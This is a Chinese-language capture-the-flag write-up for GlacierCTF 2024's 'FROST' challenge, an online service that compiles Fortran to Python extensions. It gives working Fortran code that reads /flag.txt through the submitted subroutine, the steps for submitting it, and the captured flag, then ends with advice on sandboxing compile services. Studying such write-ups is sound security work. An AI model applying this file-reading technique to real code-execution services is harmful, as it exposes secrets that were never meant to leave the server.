# GlacierCTF 2024 FROST

## 题目简述

FROST（Fortran Runtime for On-demand Simulation Tasks）允许用户提交 Base64 编码的 Fortran 源码。服务把源码保存为 `/build/subroutine.f90`，用 Meson、gfortran 和 NumPy F2PY 编译成 Python 扩展，然后直接导入并执行 `subr.run_simulation()`。

沙箱虽然限制了系统环境，却没有检查用户提交的 Fortran 行为；代码在编译后与挑战进程拥有同一文件权限，因此可以在子程序中直接打开 `/flag.txt`，把内容作为返回字符串交给 Python 打印。

## 解题过程

### 1. 匹配 F2PY 调用接口

服务端固定执行：

```python
subr = import_from_path(
    "subr",
    "/build/build/subr.cpython-312-x86_64-linux-gnu.so",
)
result = subr.run_simulation(simulation_sel)
print(result)
```

因此提交源码必须导出名为 `run_simulation` 的子程序，并让 F2PY 将一个整数输入映射为 Python 参数、将字符数组输出映射为返回值：

```fortran
subroutine run_simulation(result, routine)
    implicit none
    character(len=10000), intent(out) :: result
    integer, intent(in) :: routine
```

参数在 Fortran 声明中的顺序不等于 Python 包装后的调用形式；决定映射的是 `intent(in)` 和 `intent(out)`。

### 2. 在 Fortran 中读取 flag

官方子程序忽略 `routine`，用普通文件 I/O 读取绝对路径：

```fortran
    character(len=256) :: temp_line
    integer :: unit, iostat

    result = ''
    unit = 10
    open(unit, file='/flag.txt', status='old', action='read', iostat=iostat)
    if (iostat /= 0) then
        result = 'Error opening file.'
        return
    end if

    do
        read(unit, '(A)', iostat=iostat) temp_line
        if (iostat /= 0) exit
        result = trim(result) // trim(temp_line) // new_line('a')
    end do
    close(unit)
end subroutine run_simulation
```

将源码做 Base64 编码，随后发送单独一行 `@` 结束输入，再提交任意可解析整数作为 routine；官方 exploit 使用 `69`。编译和测试完成后，Python 打印返回字符串：

```text
gctf{Wh0_N33d$_S3cur1ty_Wh3n_U've_G0t_Ch1ll1n9_$p33d}
```

## 方法总结

题目表面是科学计算接口，实质是未受约束的原生代码执行。nsjail 只隔离主机，不会自动阻止沙箱内的用户代码读取同沙箱秘密；F2PY 也只是语言绑定，不是安全边界。安全的在线编译服务应在不含秘密的独立容器中编译和运行，使用最小只读文件系统、独立 UID 和严格系统调用策略，并把编译阶段与处理秘密的服务完全分离。
